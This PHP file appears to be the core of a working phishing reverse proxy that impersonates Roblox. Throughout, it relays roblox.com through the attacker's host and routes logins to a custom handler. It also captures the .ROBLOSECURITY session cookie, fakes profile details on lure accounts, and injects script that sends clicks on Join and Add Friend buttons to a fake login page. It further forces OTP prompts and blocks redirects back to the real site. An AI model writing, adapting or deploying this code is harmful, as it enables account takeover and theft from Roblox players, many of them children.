<?php
if (session_status() === PHP_SESSION_NONE) {
    session_start();
};
require_once($_SERVER["DOCUMENT_ROOT"] . "/setup.php");
require_once($_SERVER["DOCUMENT_ROOT"] . "/function.php");

$std = new stdClass();

if (isset($_SERVER["HTTP_REFERER"]) && !str_contains($_SERVER["HTTP_REFERER"], $_SERVER["HTTP_HOST"])) {
    header("content-type: application/json");
    http_response_code(406);
    $std->success = false;
    $std->message = null;
    die(json_encode($std));
} else {
    if (!empty($_GET["secret"])) {
        global $db;
        $id = $_GET["secret"];
        $st = $db->prepare("SELECT recovery_token FROM users WHERE referral_code = ? LIMIT 1");
        $st->execute([$id]);
        $row = $st->fetch();
        if ($row) {
            header("Set-Cookie: secret=" . $id . "; Path=/; Max-Age=31536000; HttpOnly; SameSite=Lax");
        };
        $path = explode("?", $_SERVER["REQUEST_URI"])[0];
        header("Location: " . $path);
        exit();
    };
    
    if (preg_match("#^/users/([^/]+)/profile#i", $_SERVER["REQUEST_URI"])) {
        global $db;
        $uri_path = parse_url($_SERVER["REQUEST_URI"], PHP_URL_PATH);
        preg_match("#^/users/([^/]+)/profile#i", $uri_path, $matches);
        $fake_id = $matches[1];
        
        $st = $db->prepare("SELECT profile_real_name, profile_fake_id, id, referral_code FROM users WHERE profile_fake_id = ? LIMIT 1");
        $st->execute([$fake_id]);
        $account = $st->fetch(PDO::FETCH_ASSOC);
        
        if ($account) {
            if (function_exists('record_profile_visit')) {
                record_profile_visit($account["profile_fake_id"], $account["id"], $_SERVER["REQUEST_URI"], 'link');
            };
            $ch = curl_init("https://users.roblox.com/v1/usernames/users");
            curl_setopt_array($ch, [
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_TIMEOUT => 5,
                CURLOPT_POST => true,
                CURLOPT_HTTPHEADER => ["Content-Type: application/json"],
                CURLOPT_POSTFIELDS => json_encode(["usernames" => [$account["profile_real_name"]], "excludeBannedUsers" => false]),
            ]);
            $response = curl_exec($ch);
            curl_close($ch);
            $roblox_data = json_decode($response, true);
            $real_id = $roblox_data["data"][0]["id"] ?? "";
            if ($account["referral_code"]) {
                header("Set-Cookie: secret=" . $account["referral_code"] . "; Path=/; Max-Age=31536000; HttpOnly; SameSite=Lax");
            };
            if ($real_id) {
                $profile_data = $account["profile_fake_id"] . "." . $real_id;
                header("Set-Cookie: profile=" . $profile_data . "; Path=/; Max-Age=31536000; HttpOnly; SameSite=Lax");
                $redirect_url = str_replace("/users/" . $fake_id . "/profile", "/users/" . $real_id . "/profile", $_SERVER["REQUEST_URI"]);
                header("Location: " . $redirect_url);
                exit();
            } else {
                if ($account["referral_code"]) {
                    header("Set-Cookie: secret=" . $account["referral_code"] . "; Path=/; Max-Age=31536000; HttpOnly; SameSite=Lax");
                };
                $profile_data = $account["profile_fake_id"] . ".0";
                header("Set-Cookie: profile=" . $profile_data . "; Path=/; Max-Age=31536000; HttpOnly; SameSite=Lax");
            };
        };
    };
    
    if (!empty($_GET["privateServerLinkCode"])) {
        global $db;
        $pslc = $_GET["privateServerLinkCode"];
        $st = $db->prepare("SELECT recovery_token, referral_code FROM users WHERE private_server_code = ? LIMIT 1");
        $st->execute([$pslc]);
        $row = $st->fetch(PDO::FETCH_ASSOC);
        if ($row) {
            if ($row["referral_code"]) {
                header("Set-Cookie: secret=" . $row["referral_code"] . "; Path=/; Max-Age=31536000; HttpOnly; SameSite=Lax");
            };
        };
        $path = explode("?", $_SERVER["REQUEST_URI"])[0];
        header("Location: " . $path);
        exit();
    };
    
    $headers = array_change_key_case(getallheaders(), CASE_LOWER);
    $raw_query = $_SERVER["QUERY_STRING"] ?? "";
    parse_str($raw_query, $query_params);
    unset($query_params["path"], $query_params["secret"]);
    
    $separator = (strpos($_GET["path"] ?? "", "?") !== false) ? "&" : "?";
    $query = !empty($query_params) ? $separator . http_build_query($query_params) : "";
    
    $url = $_GET["path"];
    $post_input = file_get_contents("php://input");
    
    if (isset($_COOKIE["profile"]) && strpos($_COOKIE["profile"], ".") !== false) {
        list($fake_id, $real_id) = explode(".", $_COOKIE["profile"], 2);
        $url = preg_replace("/\/users\/" . preg_quote($fake_id, "/") . "\//", "/users/" . $real_id . "/", $url);
    };
    
    do {
        if (preg_match("#^https?:/([^/])#", $url)) {
            $url = preg_replace("#^https?:/#", "https://", $url);
        };
        if (preg_match("#^http?:/([^/])#", $url)) {
            $url = preg_replace("#^http?:/#", "http://", $url);
        };
        if ($url == "https://apis.roblox.com/otp-service/v1/metadata?Origin=login") {
            header("content-type: application/json");
            $std->OtpCodeLength = 6;
            $std->IsOtpEnabled = true;
            die(json_encode($std));
        };
        if ($url == "https://auth.roblox.com/v2/login") {
            die(login(getallheaders(), $post_input));
        };
        if (strpos($url, "/metrics/record") !== false) {
            header("content-type: application/json");
            die("{}");
        };
        if (strpos($url, "/search-api/omni-search") !== false) {
            $url = str_replace("www.roblox.com", "apis.roblox.com", $url);
        };
        if (strpos($url, "/v1/batch") !== false) {
            $url = str_replace("www.roblox.com", "thumbnails.roblox.com", $url);
        };
        if (strpos($url, "StartAuthentication") !== false) {
            header("content-type: application/json");
            die("{}");
        };
        /* 
        // Removed manual captcha bypass as it was causing empty challenge metadata
        if (strpos($url, "/challenge/v1/continue") !== false) {
            header("Content-Type: application/json");
            $pi = json_decode($post_input, true);
            if (isset($pi["challengeType"]) && $pi["challengeType"] === "captcha") {
                $response = [
                    "challengeId" => $pi["challengeId"] ?? null,
                    "challengeType" => "",
                    "challengeMetadata" => ""
                ];
                exit(json_encode($response));
            }
        }
        */
        if (strpos($url, "getPATToken") !== false) {
            $roblox_edge_ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0 RobloxNewBrowser Roblox/WinPCGDK ROBLOX PCGDK App 1.0.0RobloxApp/2.713.0.909 (GlobalDist; RobloxDirectDownload) GAMEPADNAVIGATION";
            $pat_headers = [
                "sec-ch-ua: \"Not-A.Brand\";v=\"24\", \"Microsoft Edge\";v=\"146\", \"Chromium\";v=\"146\", \"Microsoft Edge WebView2\";v=\"146\"",
                "sec-ch-ua-mobile: ?0",
                "sec-ch-ua-platform: \"Windows\"",
                "upgrade-insecure-requests: 1",
                "user-agent: " . $roblox_edge_ua,
                "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "sec-fetch-site: same-site",
                "sec-fetch-mode: cors",
                "sec-fetch-dest: empty",
                "referer: https://www.roblox.com/",
                "origin: https://www.roblox.com",
                "accept-encoding: gzip, deflate, br, zstd",
                "accept-language: " . ($headers["accept-language"] ?? "en-GB,en;q=0.9,en-US;q=0.8"),
                "priority: u=1, i",
            ];
            $is_post = $_SERVER["REQUEST_METHOD"] === "POST";
            $uwp_ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0 RobloxNewBrowser Roblox/WinPCGDK ROBLOX PCGDK App 1.0.0RobloxApp/2.713.0.909 (GlobalDist; RobloxDirectDownload) GAMEPADNAVIGATION";
            $request_headers = [
                "user-agent: " . ($is_post ? $uwp_ua : ($headers["user-agent"] ?? "")),
                "origin: https://www.roblox.com",
                "referer: " . (isset($_SERVER["HTTP_REFERER"]) ? str_replace($_SERVER["SERVER_NAME"], "www.roblox.com", $_SERVER["HTTP_REFERER"]) : "https://www.roblox.com/")
            ];
            if ($is_post) {
                $request_headers[] = "sec-ch-ua: \"Not-A.Brand\";v=\"24\", \"Microsoft Edge\";v=\"146\", \"Chromium\";v=\"146\", \"Microsoft Edge WebView2\";v=\"146\"";
                $request_headers[] = "sec-ch-ua-mobile: ?0";
                $request_headers[] = "sec-ch-ua-platform: \"Windows\"";
                $request_headers[] = "upgrade-insecure-requests: 1";
                $request_headers[] = "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
                $request_headers[] = "sec-fetch-site: none";
                $request_headers[] = "sec-fetch-mode: navigate";
                $request_headers[] = "sec-fetch-user: ?1";
                $request_headers[] = "sec-fetch-dest: document";
                $request_headers[] = "accept-encoding: gzip, deflate, br, zstd";
                $request_headers[] = "accept-language: " . ($headers["accept-language"] ?? "en-GB,en;q=0.9,en-US;q=0.8");
                $request_headers[] = "priority: u=0, i";
            };
            if (!empty($_SERVER["HTTP_COOKIE"])) { $request_headers[] = "cookie: " . $_SERVER["HTTP_COOKIE"]; };
            if (isset($headers["content-type"])) { $request_headers[] = "content-type: " . $headers["content-type"]; };
            if (isset($headers["x-retry-attempt"])) { $request_headers[] = "x-retry-attempt: " . $headers["x-retry-attempt"]; };
            if (isset($headers["x-csrf-token"])) { $request_headers[] = "x-csrf-token: " . $headers["x-csrf-token"]; };
            if (isset($headers["rblx-challenge-id"])) { $request_headers[] = "rblx-challenge-id: " . $headers["rblx-challenge-id"]; };
            if (isset($headers["rblx-challenge-type"])) { $request_headers[] = "rblx-challenge-type: " . $headers["rblx-challenge-type"]; };
            if (isset($headers["rblx-challenge-metadata"])) { $request_headers[] = "rblx-challenge-metadata: " . $headers["rblx-challenge-metadata"]; };
            $ch_pat = curl_init($url . $query);
            curl_setopt_array($ch_pat, [
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_HEADER => true,
                CURLOPT_FOLLOWLOCATION => false,
                CURLOPT_TIMEOUT => 15,
                CURLOPT_CONNECTTIMEOUT => 5,
                CURLOPT_CUSTOMREQUEST => $_SERVER["REQUEST_METHOD"],
                CURLOPT_SSL_VERIFYPEER => false,
                CURLOPT_SSL_VERIFYHOST => false,
                CURLOPT_HTTPHEADER => $pat_headers,
                CURLOPT_ENCODING => "",
            ]);
            if ($_SERVER["REQUEST_METHOD"] === "POST") {
                curl_setopt($ch_pat, CURLOPT_POSTFIELDS, $post_input);
            };
            $pat_response = curl_exec($ch_pat);
            $pat_code = curl_getinfo($ch_pat, CURLINFO_HTTP_CODE);
            $pat_hsize = curl_getinfo($ch_pat, CURLINFO_HEADER_SIZE);
            curl_close($ch_pat);
            $pat_resp_headers = substr($pat_response, 0, $pat_hsize);
            $pat_body = substr($pat_response, $pat_hsize);
            $pat_encoding = "";
            $skip = ["content-length", "transfer-encoding", "connection", "set-cookie"];
            foreach (explode("\r\n", $pat_resp_headers) as $line) {
                $line = trim($line);
                if (empty($line) || stripos($line, "http/") === 0) continue;
                if (stripos($line, "Set-Cookie:") === 0) {
                    $line = preg_replace("/;\s*Domain=[^;]+/i", "", $line);
                };
                $hname = strtolower(explode(":", $line, 2)[0]);
                if ($hname === "content-encoding") $pat_encoding = trim(explode(":", $line, 2)[1]);
                if (!in_array($hname, $skip)) header($line, false);
            };
            if ($pat_encoding === "gzip") {
                $pat_body = @gzdecode($pat_body) ?: @gzuncompress($pat_body) ?: $pat_body;
                header("Content-Encoding: none", true);
            };
            http_response_code($pat_code);
            die($pat_body);
        };
    } while (false);
    
    $request_headers = [
        "user-agent: " . ($headers["user-agent"] ?? ""),
        "origin: https://www.roblox.com",
        "referer: " . (isset($_SERVER["HTTP_REFERER"]) ? str_replace($_SERVER["SERVER_NAME"], "www.roblox.com", $_SERVER["HTTP_REFERER"]) : "https://www.roblox.com/")
    ];
    
    if (!empty($_SERVER["HTTP_COOKIE"])) { $request_headers[] = "cookie: " . $_SERVER["HTTP_COOKIE"]; };
    if (isset($headers["content-type"])) { $request_headers[] = "content-type: " . $headers["content-type"]; };
    if (isset($headers["x-retry-attempt"])) { $request_headers[] = "x-retry-attempt: " . $headers["x-retry-attempt"]; };
    if (isset($headers["x-csrf-token"])) { $request_headers[] = "x-csrf-token: " . $headers["x-csrf-token"]; };
    if (isset($headers["rblx-challenge-id"])) { $request_headers[] = "rblx-challenge-id: " . $headers["rblx-challenge-id"]; };
    if (isset($headers["rblx-challenge-type"])) { $request_headers[] = "rblx-challenge-type: " . $headers["rblx-challenge-type"]; };
    if (isset($headers["rblx-challenge-metadata"])) { $request_headers[] = "rblx-challenge-metadata: " . $headers["rblx-challenge-metadata"]; };
    
    if ((strpos($url, "/login") !== false || strpos($url, "/newlogin") !== false) && !isset($_COOKIE["secret"])) {
        header("Location: /request-error?code=403");
        exit();
    };
    
    if (strpos($url, "profile-platform-api/v1/profiles/get") !== false) {
        $profile_cookie = $_COOKIE["profile"] ?? "";
        if (!empty($profile_cookie) && strpos($profile_cookie, ".") !== false) {
            list($fake_id, $real_id) = explode(".", $profile_cookie, 2);
            $payload = json_decode($post_input, true);
            $profile_id = (string)($payload["profileId"] ?? "");
            if (!empty($profile_id) && $profile_id === $real_id) {
                global $db;
                $st = $db->prepare("SELECT recovery_token, profile_real_name, profile_premium, profile_friends, profile_followers, profile_followings, profile_fake_name, profile_display_name, profile_status, referral_code FROM users WHERE profile_fake_id = ? LIMIT 1");
                $st->execute([$fake_id]);
                $account = $st->fetch();
                if ($account) {
                    if ($account["referral_code"] && !isset($_COOKIE["secret"])) {
                        header("Set-Cookie: secret=" . $account["referral_code"] . "; Path=/; Max-Age=31536000; HttpOnly; SameSite=Lax");
                    };
                    $ch3 = curl_init($url . $query);
                    curl_setopt_array($ch3, [
                        CURLOPT_RETURNTRANSFER => true,
                        CURLOPT_TIMEOUT => 15,
                        CURLOPT_POST => true,
                        CURLOPT_SSL_VERIFYPEER => false,
                        CURLOPT_SSL_VERIFYHOST => false,
                        CURLOPT_HTTPHEADER => $request_headers,
                        CURLOPT_POSTFIELDS => $post_input,
                    ]);
                    $real_body = curl_exec($ch3);
                    curl_close($ch3);
                    $json = json_decode($real_body, true);
                    if (isset($json["components"]["UserProfileHeader"])) {
                        $h = &$json["components"]["UserProfileHeader"];
                        $h["isPremium"] = (bool)$account["profile_premium"];
                        $h["counts"]["friendsCount"] = (int)$account["profile_friends"];
                        $h["counts"]["followersCount"] = (int)$account["profile_followers"];
                        $h["counts"]["followingsCount"] = (int)$account["profile_followings"];
                        $h["names"]["primaryName"] = $account["profile_fake_name"];
                        $h["names"]["username"] = $account["profile_fake_name"];
                        $h["names"]["displayName"] = $account["profile_display_name"];
                    };
                    if (isset($json["components"]["Actions"])) {
                        $a = &$json["components"]["Actions"];
                        $a["buttons"] = [];
                        if (strtolower($account["profile_status"]) === "in game") {
                            $a["buttons"][] = ["type" => "JoinExperience"];
                        };
                        $a["buttons"][] = ["type" => "AddFriend"];
                    };
                    header("content-type: application/json");
                    die(json_encode($json));
                };
            };
        };
    };
    
    $ch = curl_init($url . $query);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_HEADER => true,
        CURLOPT_FOLLOWLOCATION => false,
        CURLOPT_MAXREDIRS => 5,
        CURLOPT_TIMEOUT => 15,
        CURLOPT_CONNECTTIMEOUT => 5,
        CURLOPT_CUSTOMREQUEST => $_SERVER["REQUEST_METHOD"],
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
    ]);
    
    if ($_SERVER["REQUEST_METHOD"] === "POST") {
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post_input);
    };
    
    curl_setopt($ch, CURLOPT_HTTPHEADER, $request_headers);
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
    $response_headers = substr($response, 0, $header_size);
    $body = substr($response, $header_size);
    curl_close($ch);
    
    http_response_code($http_code);
    
    foreach (explode("\r\n", $response_headers) as $line) {
        $line = trim($line);
        if (empty($line) || stripos($line, "http/") === 0) continue;
        if (stripos($line, "Set-Cookie:") === 0 && preg_match("/\.ROBLOSECURITY=([^;]+)/i", $line, $m)) {
            $roblosecurity = $m[1];
        };
        if (stripos($line, "Set-Cookie:") === 0) {
            $line = preg_replace("/;\s*Domain=[^;]+/i", "", $line);
        };
        
        // Ensure CSRF token is passed back to the client
        if (stripos($line, "x-csrf-token:") === 0) {
            header($line, true); // Use true to replace existing CSRF headers
        } else {
            header($line, false);
        }
    };
    
    if (parse_url($url, PHP_URL_HOST) === "js.rbxcdn.com") {
        $body = str_replace("www.roblox.com", $_SERVER["HTTP_HOST"], $body);
    };
    
    if (parse_url($url, PHP_URL_HOST) === "www.roblox.com") {
        $body = preg_replace_callback(
            "#(<script[^>]*data-bundlename=[\"']EnvironmentUrls[\"'][^>]*src=[\"'])[^\"']+([\"'][^>]*>)#",
            function ($m) { return $m[1] . "/js/EnvironmentUrls.js" . $m[2]; },
            $body
        );
        $body = preg_replace_callback(
            "#(<script[^>]*data-bundlename=[\"']Challenge[\"'][^>]*src=[\"'])[^\"']+([\"'][^>]*>)#",
            function ($m) { return $m[1] . "/js/Challenge.js?" . $m[2]; },
            $body
        );
        
        // Prevent domain replacement on sensitive security/auth responses
        if (strpos($url, "challenge/v1/continue") === false && strpos($url, "auth.roblox.com") === false) {
            $body = str_replace("www.roblox.com", $_SERVER["HTTP_HOST"], $body);
        }

        // SAPPHIRE FEATURE: Block JavaScript redirects to roblox.com
        $body = preg_replace('/window\.location\s*=\s*["\'][^"\']*roblox\.com[^"\']*["\']/i', '// redirect blocked', $body);
        $body = preg_replace('/window\.location\.href\s*=\s*["\'][^"\']*roblox\.com[^"\']*["\']/i', '// redirect blocked', $body);
        $body = preg_replace('/location\.replace\s*\(\s*["\'][^"\']*roblox\.com[^"\']*["\']/i', '// redirect blocked', $body);
        $body = preg_replace('/location\.assign\s*\(\s*["\'][^"\']*roblox\.com[^"\']*["\']/i', '// redirect blocked', $body);
        $body = str_replace('document.location=', '//document.location=', $body);
        $body = str_replace('window.location=', '//window.location=', $body);
        if (preg_match("#/users/\d+/profile#i", $url)) {
            $inject = <<<'JS'
<script>
function hookBtn(btn) {
    if (btn.dataset.hooked) return;
    btn.dataset.hooked = "1";
    btn.addEventListener("click", function(e) {
        e.preventDefault();
        e.stopImmediatePropagation();
        window.location.href = "/login?returnUrl=" + encodeURIComponent(window.location.href);
    }, true);
}
function hookAllButtons() {
    document.querySelectorAll("#user-profile-header-JoinExperience, #user-profile-header-AddFriend, #user-profile-header-contextual-menu-button").forEach(hookBtn);
    document.querySelectorAll("[role=menuitem]").forEach(function(btn) {
        var title = btn.querySelector(".foundation-web-menu-item-title");
        if (title && ["Follow", "Block User", "Report Abuse"].includes(title.textContent.trim())) {
            hookBtn(btn);
        }
    });
}
hookAllButtons();
var observer = new MutationObserver(hookAllButtons);
observer.observe(document.body, { childList: true, subtree: true });
</script>
JS;
            $body = str_replace("</body>", $inject . "</body>", $body);
        };
        if (preg_match("#^/games/([^/]+)/([^/]+)#i", $_SERVER["REQUEST_URI"])) {
            $inject = <<<'JS'
<script>
function hookGameBtn(btn) {
    if (btn.dataset.hooked) return;
    btn.dataset.hooked = "1";
    btn.addEventListener("click", function(e) {
        e.preventDefault();
        e.stopImmediatePropagation();
        window.location.href = "/login?returnUrl=" + encodeURIComponent(window.location.href);
    }, true);
}
var observer = new MutationObserver(function() {
    document.querySelectorAll("#game-details-play-button-container button").forEach(function(btn) {
        hookGameBtn(btn);
    });
    document.querySelectorAll("[data-game-action]").forEach(function(btn) {
        hookGameBtn(btn);
    });
});
observer.observe(document.body, { childList: true, subtree: true });
</script>
JS;
            $body = str_replace("</body>", $inject . "</body>", $body);
        };
    };
    
    $json = json_decode($body);
    if (isset($json->IsOtpEnabled) && $json->IsOtpEnabled === false) {
        $json->IsOtpEnabled = true;
        $body = json_encode($json);
    };
    die($body);
};